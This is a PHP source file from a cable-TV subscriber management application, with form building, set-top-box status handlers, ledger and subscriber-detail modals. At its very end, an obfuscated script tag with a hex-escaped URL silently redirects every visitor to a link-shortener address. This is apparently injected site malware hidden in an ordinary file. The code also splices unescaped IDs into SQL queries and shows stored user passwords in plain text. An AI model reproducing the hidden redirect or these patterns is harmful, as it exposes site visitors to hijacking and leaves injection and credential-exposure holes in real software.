                                            $subscriberBoxes .='<input type="text" name="amount1[]" id="amount'.$i.'" class="form-control" value="">';
                                    $subscriberBoxes .='</div>
                                    '.(($i==1)?'<div class="col-sm-1">
                                        <label>&nbsp;</label>
                                        <a href="javascript:;" onclick="AddMore();"  title="Add More"><img src="images/plus.png"  style="margin: 24px 0px 0px;"/></a>
                                    </div>':'').'
                                    <div class="form-group col-lg-3">
                                        <label>Identity Name</label>
                                        <input type="text" name="identity_name[]" id="identity_name'.$i.'" class="form-control" value="">
                                    </div>
                                    <div class="form-group col-lg-2">
                                        <label>Id Type </label>
                                        <input type="text" name="type_id[]" id="type_id'.$i.'" class="form-control" value="">
                                    </div>
                                    <div class="form-group col-lg-2">
                                        <label>Id No </label>
                                        <input type="text" name="id_no[]" id="id_no'.$i.'" class="form-control" value="">
                                    </div>
                                    <div class="form-group col-lg-2" >
                                            <label>
                                                <input checked="checked" type="radio" name="relation[]" id="relation'.$i.'" value="S/O"> S/o
                                            </label>
                                            <label>
                                                <input type="radio" name="relation[]" id="relation'.$i.'" value="W/O"> W/o
                                            </label>
                                            <label>
                                                <input type="radio" name="relation[]" id="relation'.$i.'" value="D/O"> D/o
                                            </label>
                                        <input type="text" name="relative[]" id="relative'.$i.'" class="form-control" value="">
                                    </div>
                                    <div class="form-group col-lg-2">
                                        <label>Installed By </label>
                                        <input type="text" name="installed_by[]" id="installed_by'.$i.'" class="form-control" value="">
                                    </div>
                                </div>';   
    }else{
        $plus='Y';
        $totalAmt=0;
        foreach ($subscriberBoxRecs as $key => $recs) {
            
            $packageArr =   $objMisc->myFunc->fnWriteOptionList($recs['package_id'],'NAME,PACKAGE_ID','package_master',$wherePackage,0,0,0);  
            $wherelaCarte      =   " 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND PACKAGE_TYPE='L' and STATUS = 'A' order by PACKAGE_ID DESC";
            //$laCarteArray      =   $objMisc->myFunc->fnWriteOptionListIds($recs['la_carte_id'].'_'.$parentCharges,'NAME,PACKAGE_ID,PARENT_CHARGES','package_master',$wherelaCarte,0,0,0);  
            $parentCharges=$recs['la_carte_amount'];
            if($recs['status']=='A'){
                $subscriberBoxes .='<div class="col-lg-12">
                                        <div class="col-sm-3">
                                            <label>Stb NO</label>
                                            <input required type="text" readonly value="'.$recs['stb_no'].'" name="subscription[]" id="subscription_id1'.$i.'" autocomplete="off" class="form-control"/>
                                            <input required type="hidden" value="'.$recs['subscription_id'].'" name="subscription_id[]" id="subscription1'.$i.'" autocomplete="off" class="form-control"/>
                                            <input required type="hidden" value="'.$recs['stb_id'].'" name="stb_id[]" id="stb_id'.$i.'" autocomplete="off" class="form-control"/>
                                            <div id="display1'.$i.'" class="display"></div>
                                        </div>
                                        <div class="col-sm-2">
                                            <label>Package</label>
                                            <select id="package_id'.$i.'"  name="package_id[]" onchange="TotAmt('.$i.')" class="form-control">
                                                <option value="">-Please Select-</option>
                                                '.$packageArr.'
                                            </select>
                                        </div>
                                        <div class="col-sm-2">
                                            <label style="float:left;width:100%;">A La Carte</label>
                                            <input type="text" name="la_carte_name[]" id="la_carte_name'.$i.'" class="form-control" style="float:left;width:48%" placeholder="Name" value="'.$recs['la_carte_name'].'">&nbsp;
                                            <input type="text" name="la_carte_amount[]" id="la_carte_amount'.$i.'" class="form-control" onkeyup="TotAmt('.$i.');" style="float:left;width:48%" placeholder="Price" value="'.$recs['la_carte_amount'].'">
                                        </div>
                                        <div class="col-sm-2">
                                            <label>Box Charges</label>';
                                                $subscriberBoxes .='<input type="text" name="box_charges[]" id="box_charges'.$i.'" class="form-control" value="'.$recs['box_charges'].'">
                                        </div>
                                        <div class="col-sm-2">
                                            <label>Amount</label>';
                                                $amount=$parentCharges+$objMisc->GiveValue("PACKAGE_ID='$recs[package_id]'",'PARENT_CHARGES','package_master');
                                                $subscriberBoxes .='<input type="text" name="amount1[]" id="amount'.$i.'" class="form-control" value="'.$amount.'">';
                                        $subscriberBoxes .='</div>';
                                        if($i==1 && $plus=='Y'){
                                            $plus='N';
                                            $subscriberBoxes .='<div class="col-sm-1">
                                                                    <label>&nbsp;</label>
                                                                    <a href="javascript:;" onclick="AddMore();"  title="Add More"><img src="images/plus.png"  style="margin: 24px 0px 0px;"/></a>
                                                                </div>';
                                                            }
                                            $subscriberBoxes .='
                                            <div class="form-group col-lg-3">
                                                <label>Identity Name</label>
                                                <input type="text" name="identity_name[]" id="identity_name'.$i.'" class="form-control" value="'.$recs['identity_name'].'">
                                            </div>
                                            <div class="form-group col-lg-2">
                                                <label>Id Type </label>
                                                <input type="text" name="type_id[]" id="type_id'.$i.'" class="form-control" value="'.$recs['type_id'].'">
                                            </div>
                                            <div class="form-group col-lg-2">
                                                <label>Id No </label>
                                                <input type="text" name="id_no[]" id="id_no'.$i.'" class="form-control" value="'.$recs['id_no'].'">
                                            </div>
                                            <div class="form-group col-lg-2" >
                                                    <label>
                                                        <input '.(($recs['relation']=='S/O')?'checked="checked"':'').' type="radio" name="relation[]" id="relation'.$i.'" value="S/O"> S/o
                                                    </label>
                                                    <label>
                                                        <input type="radio" '.(($recs['relation']=='W/O')?'checked="checked"':'').' name="relation[]" id="relation'.$i.'" value="W/O"> W/o
                                                    </label>
                                                    <label>
                                                        <input type="radio" '.(($recs['relation']=='D/O')?'checked="checked"':'').' name="relation[]" id="relation'.$i.'" value="D/O"> D/o
                                                    </label>
                                                <input type="text" name="relative[]" id="relative'.$i.'" class="form-control" value="'.$recs['relative'].'">
                                            </div>
                                            <div class="form-group col-lg-2">
                                                <label>Installed By </label>
                                                <input type="text" name="installed_by[]" id="installed_by'.$i.'" class="form-control" value="'.$recs['installed_by'].'">
                                            </div></div>'; 
                $totalAmt=$totalAmt+$amount; 
                $i++;              
            }/*else{
                $subscriberBoxes .='<div class="col-lg-12">
                                        <div class="col-sm-3">
                                            <label>Stb NO</label>
                                            <input required type="text" readonly value="'.$recs['stb_no'].'" name="subscription[]" class="form-control"/>
                                            <div  class="display"></div>
                                        </div>
                                        <div class="col-sm-2">
                                            <label>Package</label>
                                            <select disabled class="form-control">
                                                <option value="">-Please Select-</option>
                                                '.$packageArr.'
                                            </select>
                                        </div>
                                        <div class="col-sm-2">
                                            <label style="float:left;width:100%;">A La Carte</label>
                                            <input type="text" name="la_carte_name[]" id="la_carte_name'.$i.'" class="form-control" style="float:left;width:48%" placeholder="Name" disabled value="'.$recs['la_carte_name'].'">&nbsp;
                                            <input type="text" name="la_carte_amount[]" id="la_carte_amount'.$i.'" class="form-control" onkeyup="TotAmt('.$i.');" style="float:left;width:48%" placeholder="Price" disabled value="'.$recs['la_carte_amount'].'">
                                        </div>
                                        <div class="col-sm-2">
                                            <label>Box Charges</label>';
                                                $subscriberBoxes .='<input type="text" name="box_charges[]" id="box_charges'.$i.'" class="form-control" readonly value="'.$recs['box_charges'].'">
                                        </div>
                                        <div class="col-sm-2">
                                            <label>Amount</label>';
                                                $amount=$parentCharges+$objMisc->GiveValue("PACKAGE_ID='$recs[package_id]'",'PARENT_CHARGES','package_master');
                                                $subscriberBoxes .='<input type="text" class="form-control" disabled readonly value="'.$amount.'">';
                                        $subscriberBoxes .='</div>';
                                        if($plus=='Y'){
                                            $plus='N';
                                            $subscriberBoxes .='<div class="col-sm-1">
                                                                    <label>&nbsp;</label>
                                                                    <a href="javascript:;" onclick="AddMore();"  title="Add More"><img src="images/plus.png"  style="margin: 24px 0px 0px;"/></a>
                                                                </div>';
                                        }
                                            $subscriberBoxes .='</div>
                                            <div class="form-group col-lg-3">
                                                <label>Identity Name</label>
                                                <input type="text" name="identity_name[]" id="identity_name'.$i.'" class="form-control" disabled value="'.$recs['identity_name'].'">
                                            </div>
                                            <div class="form-group col-lg-2">
                                                <label>Id Type </label>
                                                <input type="text" name="type_id[]" id="type_id'.$i.'" class="form-control" disabled value="'.$recs['type_id'].'">
                                            </div>
                                            <div class="form-group col-lg-2">
                                                <label>Id No </label>
                                                <input type="text" name="id_no[]" id="id_no'.$i.'" class="form-control" disabled value="'.$recs['id_no'].'">
                                            </div>
                                            <div class="form-group col-lg-2" >
                                                    <label>
                                                        <input disabled '.(($recs['relation']=='S/O')?'checked="checked"':'').' type="radio" name="relation[]" id="relation'.$i.'" value="S/O"> S/o
                                                    </label>
                                                    <label>
                                                        <input disabled type="radio" '.(($recs['relation']=='W/O')?'checked="checked"':'').' name="relation[]" id="relation'.$i.'" value="W/O"> W/o
                                                    </label>
                                                    <label>
                                                        <input disabled type="radio" '.(($recs['relation']=='D/O')?'checked="checked"':'').' name="relation[]" id="relation'.$i.'" value="D/O"> D/o
                                                    </label>
                                                <input type="text" name="relative[]" id="relative'.$i.'" class="form-control" disabled value="'.$recs['relative'].'">
                                            </div>
                                            <div class="form-group col-lg-2">
                                                <label>Installed By </label>
                                                <input type="text" name="installed_by[]" id="installed_by'.$i.'" class="form-control" disabled value="'.$recs['installed_by'].'">
                                            </div>'; 
            }*/
            
        }
        if(empty($subscriberBoxes)){
            $subscriberBoxes.=' <div class="col-lg-12">        
                                        <div class="col-sm-3">
                                            <label>Stb NO</label>
                                            <input type="text" name="subscription[]" onkeyup="KeyedUp1(1);" id="subscription_id11" autocomplete="off" class="form-control"/>
                                            <input type="hidden" name="subscription_id[]" id="subscription11" autocomplete="off" class="form-control"/>
                                            <div id="display11" class="display"></div>
                                        </div>
                                        <div class="col-sm-2">
                                            <label>Package</label>
                                            <select id="package_id1" onchange="TotAmt(1);"  name="package_id[]" class="form-control" required>
                                                <option value="">-Please Select-</option>
                                                '.$packageArray.'
                                            </select>
                                        </div>
                                        <div class="col-sm-2">
                                            <label style="float:left;width:100%;">A La Carte</label>
                                            <input type="text" name="la_carte_name[]" id="la_carte_name1" class="form-control" style="float:left;width:48%" placeholder="Name">&nbsp;
                                            <input type="text" name="la_carte_amount[]" id="la_carte_amount1" class="form-control" onkeyup="TotAmt(1);" style="float:left;width:48%" placeholder="Price">
                                        </div>
                                        <div class="col-sm-2">
                                            <label>Box Charges</label>
                                            <input type="text" name="box_charges[]" id="box_charges1" class="form-control" value="">
                                        </div>
                                        <div class="col-sm-2">
                                            <label>Amount</label>
                                            <input type="text" name="amount1[]" id="amount1" class="form-control" value="">
                                        </div>
                                        <div class="col-sm-1">
                                            <label>&nbsp;</label>
                                            <a href="javascript:;" onclick="AddMore();"  title="Add More"><img src="images/plus.png"  style="margin: 24px 0px 0px;"/></a>
                                        </div>
                                        <div class="form-group col-lg-3">
                                            <label>Identity Name</label>
                                            <input type="text" name="identity_name[]" id="identity_name1" class="form-control" value="">
                                        </div>
                                        <div class="form-group col-lg-2">
                                            <label>Id Type </label>
                                            <input type="text" name="type_id[]" id="type_id1" class="form-control" value="">
                                        </div>
                                        <div class="form-group col-lg-2">
                                            <label>Id No </label>
                                            <input type="text" name="id_no[]" id="id_no1" class="form-control" value="">
                                        </div>
                                        <div class="form-group col-lg-2" >
                                                <label>
                                                    <input type="radio" name="relation[]" id="relation1" value="S/O" checked> S/o
                                                </label>
                                                <label>
                                                    <input type="radio" name="relation[]" id="relation1" value="W/O"> W/o
                                                </label>
                                                <label>
                                                    <input type="radio" name="relation[]" id="relation1" value="D/O"> D/o
                                                </label>
                                            <input type="text" name="relative[]" id="relative1" class="form-control" value="">
                                        </div>
                                        <div class="form-group col-lg-2">
                                            <label>Installed By </label>
                                            <input type="text" name="installed_by[]" name="installed_by1" class="form-control" value="">
                                        </div>
                                    </div>';
        }
    }
    $totSubBoxes=$i-1;
}
$totSubscribers=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STATUS='A'",'COUNT(*)','subscribers');
$totSubscribersBoxesActive=$objMisc->GiveValueNew("SELECT COUNT(*) FROM `stb_box` B JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=B.`SUBSCRIBER_ID` WHERE S.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND S.`STATUS`='A' AND B.`STATUS`='A'");
$totSubscribersBoxes=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' GROUP BY SUBSCRIPTION_ID",'COUNT(*)','stb_box');
$totBoxesAvailable=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AVAILABILITY='AV' AND STATUS='A'",'COUNT(*)','subscriptions');
$totBoxesBooked=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AVAILABILITY='B'",'COUNT(*)','subscriptions');
$totBoxesDeactive=$objMisc->GiveValueNew("SELECT COUNT(*) FROM `stb_box` B JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=B.`SUBSCRIBER_ID` WHERE S.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND (S.`STATUS`!='A' OR B.`STATUS`='D')");

$smartyVars['curDate']            =   date('d/m/Y');
$smartyVars['franchiseArray']            =   $franchiseArray;
$smartyVars['totBoxesDeactive']            =   $totBoxesDeactive;
$smartyVars['totalAmt']            =   $totalAmt;
$smartyVars['totSubscribersBoxes']            =   $totSubscribersBoxes;
$smartyVars['totSubscribers']            =   $totSubscribers;
$smartyVars['totSubscribersBoxesActive'] =   $totSubscribersBoxesActive;
$smartyVars['totBoxesAvailable']         =   $totBoxesAvailable;
$smartyVars['totBoxesBooked']            =   $totBoxesBooked;
$smartyVars['laCarteArray']         =   $laCarteArray;
$smartyVars['subscriberBoxes']      =   $subscriberBoxes;
$smartyVars['totSubBoxes']          =   ((empty($totSubBoxes) || $totSubBoxes=='')?1:$totSubBoxes);
$smartyVars['employeeArray']        =   $empArray;
$smartyVars['stbArray']             =   $stbArray;
$smartyVars['customerId']           =   $customerId;
$smartyVars['msoId']                =   $msoId;
$smartyVars['packageArray']         =   $packageArray;
$smartyVars['wingArray']            =   $wingArray;
$smartyVars['unitArray']            =   $unitArray;
$smartyVars['headofficeArray']      =   $headofficeArray;
$smartyVars['errormsg']             =   $errormsg;
$smartyVars['add']                  =   $add;
$smartyVars['group']                =   $id;
$smartyVars['rowRec']               =   $rowArray;
$smartyVars['pageheading']          =   $pageheading;
$smartyVars['classData']            =   $pagin_recs;
$smartyVars['msg']                  =   $msg;
$smartyVars['searchArray']          =   $searchArray;
$smartyVars['page']                 =   $_REQUEST['page'];
$objMisc->displayPage("header,subscribers-otherway,footer",$smartyVars);

function updateStatus($id,$status,$reason,$date)
{
    global $objMisc;
    $objResponse = new XajaxResponse();
    //$objResponse->addAlert($id);
    $changeTo = ($status=='A') ? 'D' : 'A';
    $where = "STB_ID =".$id;
    $subId=$objMisc->GiveValue($where,'SUBSCRIPTION_ID','stb_box');
    $stbNo=$objMisc->GiveValue("SUBSCRIPTION_ID='$subId'",'STB_NO','subscriptions');
    if($changeTo=='D'){
        $row = array(
                        'STATUS' => $changeTo,
                        'REMARKS'=>$reason.' | Updated on '.$date,
                        'UPDATED_BY'=>$_SESSION['USER_ID'],
                        'UPDATED_TIME'=>date('Y-m-d H:i:s')
                    );
        $row1 = array(
                        'STATUS' => (($reason=='Box is Faulty.')?$changeTo:'A'),
                        'AVAILABILITY'=>'AV',
                        'REMARKS'=>$reason.' | Updated on '.$date,
                        'UPDATED_BY'=>$_SESSION['USER_ID'],
                        'UPDATED_TIME'=>date('Y-m-d H:i:s')
                    );
        $rowUtility=array('STATUS' => (($reason=='Box is Faulty.')?$changeTo:'A'));
    }else{
        $row = array(
                        'STATUS' => $changeTo,
                        'REMARKS'=> $reason.' | Updated on '.$date,
                        'UPDATED_BY'=>$_SESSION['USER_ID'],
                        'UPDATED_TIME'=>date('Y-m-d H:i:s')
                    );
        $row1 = array(
                        'AVAILABILITY'=>'B',
                        'REMARKS'=>$reason.' | Updated on '.$date,
                        'UPDATED_BY'=>$_SESSION['USER_ID'],
                        'UPDATED_TIME'=>date('Y-m-d H:i:s')
                    );
    }
    
    //$packageId=$objMisc->GiveValue($where,'PACKAGE_ID','stb_box');
    //$packageAmt=$objMisc->GiveValue("PACKAGE_ID='$packageId'",'PARENT_CHARGES','package_master');
    $subscriberId=$objMisc->GiveValue($where,'SUBSCRIBER_ID','stb_box');
    //$amt=$objMisc->GiveValue("SUBSCRIBER_ID='$subscriberId'",'AMOUNT','subscribers');
    //$newAmt=$amt-$packageAmt;
    $rowArray = array(
                    'SUBSCRIBER_ID' => $subscriberId,
                    'HEADOFFICE_ID' => $_SESSION['HEADOFFICE'],
                    'SUBSCRIPTION_ID'=>$subId,
                    'REMARKS'=>$reason.' | Updated on '.$date,
                    'ADDED_BY'=>$_SESSION['USER_ID'],
                    'ADDED_TIME'=>date('Y-m-d H:i:s')
                );
    //$row2 = array(`AMOUNT`      =>$newAmt);
    //$objResponse->addAlert($subscriberId);
    //$objResponse->addAlert($id);
    $objMisc->update("stb_box",$row,$where);
    $objMisc->update("monthly_charges",$rowUtility,$where." AND MONTH(MONTH_DATE)='".date('m')."' AND YEAR(MONTH_DATE)='".date('Y')."' AND SUBSCRIBER_ID='$subscriberId'");
    $objMisc->update("subscriptions",$row1,"SUBSCRIPTION_ID='$subId'");
    //$objMisc->update("subscribers",$row2,"SUBSCRIBER_ID='$subscriberId'");
    $objMisc->insert("subscriber_history",$rowArray);
    $imgName =($changeTo == 'D') ? 'images/deactive-btn.gif':'images/active-btn.gif';
    if($changeTo=='A')
    {
        $title= 'Deactivate';
        $msg = 'Set Top Box has been activated successfully.';
    }
    else
    {
        $title= 'Activate';
        $msg = 'Set Top Box has been deactivated successfully.';
    } 
    if($reason=="Box is Faulty."){
        $objResponse->addAssign('status'.$id,'innerHTML','<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$id.'" id="imgStatus'.$id.'" alt="Activate" title="Box is Faulty.">');
    }else{
        $objResponse->addAssign('imgStatus'.$id,'src',$imgName);
        $objResponse->addAssign('imgStatus'.$id,'alt',$title);
        $objResponse->addAssign('imgStatus'.$id,'title',$title);
        $objResponse->addAssign('enumStatus'.$id,'value',$changeTo);
    }
    $objResponse->addScript("document.getElementById('msg').style.display='inline';");
    $objResponse->addAssign('msg','innerHTML','&nbsp;');
    $objResponse->addAssign('msg','innerHTML','<div class="alert alert-success alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>'.$msg.'</div>'); 
    $objResponse->addScript("setTimeout(\"document.getElementById('msg').style.display='none'\",3000);");
    return $objResponse;
} 
function deleteRow($id)
{
    global $objMisc;
    global $lang;
    $objResponse = new XajaxResponse();
    $idArray = explode(',',$id);
    foreach($idArray as $bid)
    {
       $where = " SUBSCRIBER_ID =".$bid;
       $objMisc->delete("subscribers",$where); 
    }
    $_SESSION['msg'] = 3;
    $sscript .= "var a;";
    $sscript .= "a = window.location;";
    $sscript .= "window.location = a;";
    //$objResponse->addAlert($sscript);
    $objResponse->addScript($sscript);
    return $objResponse;
}

function subLedger($id){
    global $objMisc;
    $objResponse = new XajaxResponse();
    $objResponse->addAssign('modalData','innerHTML','<img src="images/loader.gif" style="text-align:center;">');
    $sub=$objMisc->getRow('subscribers',"SUBSCRIBER_ID='$id'");
    $table.='<div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                        <h4 class="modal-title" id="myModalLabel">'.$sub['name'].' Ledger</h4>
                    </div>
                    <div class="modal-body" id="modalData">';
    $table.='<table style="width:100%" class="table  table-bordered table-striped">';
    //echo "SELECT `MONTH_DATE`,`ID`,RECEIPT_NO,MANUAL_RECEIPT_NO FROM `monthly_charges` WHERE SUBSCRIBER_ID='$id' AND STATUS='A' AND RECEIPT_NO!='Opening Balance' GROUP BY `MONTH_DATE` ORDER BY `MONTH_DATE` ASC";
    $collection=$objMisc->getAllrecordsNew("SELECT `MONTH_DATE`,`ID`,RECEIPT_NO,MANUAL_RECEIPT_NO FROM `monthly_charges` WHERE SUBSCRIBER_ID='$id' AND STATUS='A' AND RECEIPT_NO!='Opening Balance' GROUP BY `MONTH_DATE` ORDER BY `MONTH_DATE` ASC");
    $balance=0;
    $table.='<tr>
                <th>Receipt No</th>
                <th>Date</th>
                <th>Debit</th>
                <th>Credit</th>
                <th>Discount</th>
                <th>Balance</th>
            </tr>';
    $openingBala=$objMisc->GiveValues(" AMOUNT_TYPE='D' AND SUBSCRIBER_ID='$id' AND RECEIPT_NO='Opening Balance' AND STATUS='A'",'SUM(AMOUNT)as AMT,MONTH_DATE','monthly_charges');
    if($openingBala['amt']>0){
        $balance=$balance+$openingBala['amt'];
        $table.='<tr>
                    <td>Opening Balance</td>
                    <td>'.date('d-m-Y',strtotime($openingBala['month_date'])).'</td>
                    <td>'.$openingBala['amt'].'</td>
                    <td></td>
                    <td></td>
                    <td>'.$balance.'</td>
                </tr>';
    }
    
    $monthDate='';
    foreach ($collection as $k => $valu) {
        $debit=$objMisc->GiveValue("AMOUNT_TYPE='D' AND MONTH_DATE='$valu[month_date]' AND SUBSCRIBER_ID='$id' AND RECEIPT_NO!='Opening Balance' AND STATUS='A'",'SUM(AMOUNT)','monthly_charges');
        //$prevBal=$objMisc->GiveValue("AMOUNT_TYPE='D' AND SUBSCRIBER_ID='$id' AND RECEIPT_NO='Opening Balance'",'SUM(AMOUNT)','monthly_charges')+$objMisc->GiveValue("AMOUNT_TYPE='D' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(DISCOUNT)','monthly_charges');
        $balance=$balance+$debit;
        if($debit>0){
            $table.='<tr>
                        <td>'.$valu['receipt_no'].'<br><b>'.$valu['manual_receipt_no'].'</b></td>
                        <td>'.date('d-m-Y',strtotime($valu['month_date'])).'</td>
                        <td>'.$debit.'</td>
                        <td></td>
                        <td></td>
                        <td>'.$balance.'</td>
                    </tr>';
        }
        $credit=$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE='$valu[month_date]' AND SUBSCRIBER_ID='$id' AND STATUS='A'",'SUM(AMOUNT)','monthly_charges');
        $discount=$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE='$valu[month_date]' AND SUBSCRIBER_ID='$id' AND STATUS='A'",'SUM(DISCOUNT)','monthly_charges');
        //$prevBal=$objMisc->GiveValue("AMOUNT_TYPE='D' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(DISCOUNT)','monthly_charges');
        $balance=$balance-($credit+$discount);
        if($credit>0 || $discount>0){
            $table.='<tr>
                        <td>'.$valu['receipt_no'].'<br><b>'.$valu['manual_receipt_no'].'</b></td>
                        <td>'.date('d-m-Y',strtotime($valu['month_date'])).'</td>
                        <td></td>
                        <td>'.$credit.'</td>
                        <td>'.$discount.'</td>
                        <td>'.$balance.'</td>
                    </tr>';
        }
        /*$discount=$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE='$valu[month_date]' AND SUBSCRIBER_ID='$id' AND ID!='0'",'SUM(DISCOUNT)','monthly_charges');
        $balance=$balance-$discount;
        if($discount>0){
            $table.='<tr>
                        <td>'.$valu['receipt_no'].'<br><b>'.$valu['manual_receipt_no'].'</b></td>
                        <td>'.date('d-m-Y',strtotime($valu['month_date'])).'</td>
                        <td></td>
                        <td></td>
                        <td>'.$discount.'</td>
                        <td>'.$balance.'</td>
                    </tr>';
        }*/
           
    }     
    $table.='</table>
            </div>
            </div></div>';
    $objResponse->addAssign('myModal','innerHTML',$table);
    return $objResponse;
}
function subInfo($id){
    global $objMisc;
    $objResponse = new XajaxResponse();
    $objResponse->addAssign('modalData','innerHTML','<img src="images/loader.gif" style="text-align:center;">');
    $sub=$objMisc->getRow('subscribers',"SUBSCRIBER_ID='$id'");
    $subU=$objMisc->getRow('users',"ID='$id' AND USER_TYPE='S'");
    $table='<div class="modal-dialog">
                        <div class="modal-content">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                                <h4 class="modal-title" id="myModalLabel">Subscriber Details</h4>
                            </div>
                            <div class="modal-body" id="modalData">';
    $table.='<table style="width:100%" class="table  table-bordered table-striped">';
        $table.='<tr>
                    <th width="13%">Customer Id</th><td>'.$sub['customer_id'].'</td>
                    <th width="13%">MSO Id</th><td colspan="2">'.$sub['mso_id'].'</td>
                </tr>';
        $table.='<tr>
                    <th>Name</th><td>'.$sub['name'].'</td>
                    <th>'.$sub['relation'].'</th><td colspan="2">'.$sub['relative'].'</td>
                </tr>';
        $table.='<tr>
                    <th>Phone No</th><td>'.$sub['phone_no'].'</td>
                    <th>Email</th><td colspan="2">'.$sub['email'].'</td>
                </tr>';
            $unitDet=$objMisc->GiveValues("UNIT_ID='$sub[unit_id]'",'NAME,WING_ID','unit_master');
            $wing=$objMisc->GiveValue("WING_ID='$unitDet[wing_id]'",'NAME','wing_master');
        $table.='<tr>
                    <th colspan="5">'.$sub['address'].'<br>'.$unitDet['name'].'-'.$wing.'</th>
                </tr>';
        $table.='<tr>
                    <th>Installation Date</th><td>'.(($sub['connection_date']!='0000-00-00')?$objMisc->dateFormat($sub['connection_date']):'').'</td>
                    <th>Username<br>Password</th><td colspan="2">'.$subU['username'].'<br>'.$subU['password'].'</td>
                </tr>';
        $table.='</table>
                 <table class="table table-bordered table-striped" style="font-size:11px;">';
        $table.='<tr>
                    <th colspan="7" style="text-align:center;">STB Detail</th>
                </tr>';
        $rec=$objMisc->getAllRecordsNew("SELECT B.STB_NO,B.REMARKS,P.NAME,P.PARENT_CHARGES,S.* FROM `stb_box` S JOIN `subscriptions` B ON S.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID JOIN `package_master` P ON P.PACKAGE_ID=S.PACKAGE_ID WHERE SUBSCRIBER_ID='$id'");
        $q=1;
        $table.='<tr><th>S.No</th><th style="width:15%">Stb No</th><th style="width:20%">Identity Details</th><th style="width:20%">Installation Details</th><th style="width:15%">Package</th><th style="width:15%">A La Carte</th><th>Charges</th></tr>';
        $totCharges=0;
        foreach ($rec as $k => $value) {
            //$laCartePackage=$objMisc->GiveValues("PACKAGE_ID='$value[la_carte_id]' AND PACKAGE_TYPE='L'",'NAME,PARENT_CHARGES','package_master');
            if($value['status']=='A'){
                $table.='<tr style="color:#005E00;" title="Active Box">
                            <td>'.$q.'</td>
                            <td>'.$value['stb_no'].'</td>
                            <td>'.$value['identity_name'].'<br>'.$value['relation'].' '.$value['relative'].'</td>
                            <td>'.$value['installed_by'].(($value['installation_fees']!='')?'<br>Fees '.$value['installation_fees']:'').(($value['joining_date']!='0000-00-00 00:00:00')?'<br>Date '.$objMisc->DateFormat($value['joining_date']):'').'</td>
                            <td>'.$value['name'].'</td>
                            <td>'.(($value['la_carte_amount']=='0.00')?'Not Applicable':$value['la_carte_name'].'<br>'.$value['la_carte_amount']).'</td>
                            <td style="text-align:right;">'.($value['parent_charges']+$value['la_carte_amount']).'</td>
                        </tr>';
                $totCharges=$totCharges+$value['parent_charges']+$value['la_carte_amount'];
            }else{
                $table.='<tr title="'.$value['remarks'].'" style="color:'.((substr($value['remarks'],0,14)=='Box is Faulty.')?'#D20000':((substr($value['remarks'],0,23)=='Permanent Disconnection')?'#FFA500':'#0000FF')).';">
                            <td>'.$q.'</td>
                            <td>'.$value['stb_no'].'</td>
                            <td>'.$value['identity_name'].'<br>'.$value['relation'].' '.$value['relative'].'</td>
                            <td>'.$value['installed_by'].(($value['installation_fees']!='')?'<br>Fees '.$value['installation_fees']:'').(($value['joining_date']!='0000-00-00 00:00:00')?'<br>Date '.$objMisc->DateFormat($value['joining_date']):'').'</td>
                            <td>'.$value['name'].'</td>
                            <td>'.(($value['la_carte_amount']=='0.00')?'Not Applicable':$value['la_carte_name'].'<br>'.$value['la_carte_amount']).'</td>
                            <td style="text-align:right;">'.($value['parent_charges']+$value['la_carte_amount']).'</td>
                        </tr>';
            }
            $q++;
        }
        $table.='<tr><th colspan="6" style="text-align:right;">Total</th><th style="text-align:right;">'.$totCharges.'</th></tr>';
        $table.='<tr><th colspan="7" style="text-align:left;">Color Notations =>&nbsp;&nbsp;&nbsp;&nbsp;<b style="color:#005E00;">Active Boxes</b> |&nbsp;&nbsp;&nbsp;&nbsp;<b style="color:#D20000">Box is Faulty.</b> &nbsp;&nbsp;&nbsp;&nbsp;| <b style="color:#FFA500">Permanent Disconnection</b> |&nbsp;&nbsp;&nbsp;&nbsp;<b style="color:#0000FF">Non Payment/Others</b></th></tr>';
    $table.='</table>
            </div>
            </div></div>';
    $objResponse->addAssign('myModal','innerHTML',$table);
    return $objResponse;
}
function delSubscriber($id){
    global $objMisc;
    $objResponse = new XajaxResponse();
    $where="SUBSCRIBER_ID='$id'";
    $rowArray=array('STATUS'    =>'T');
    $update=$objMisc->update('subscribers',$rowArray,$where);
    $_SESSION['msg']=3;
    $sscript .= "var a;";
    $sscript .= "a = window.location;";
    $sscript .= "window.location = a;";
    //$objResponse->addAlert($sscript);
    $objResponse->addScript($sscript);
    return $objResponse;
} 
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
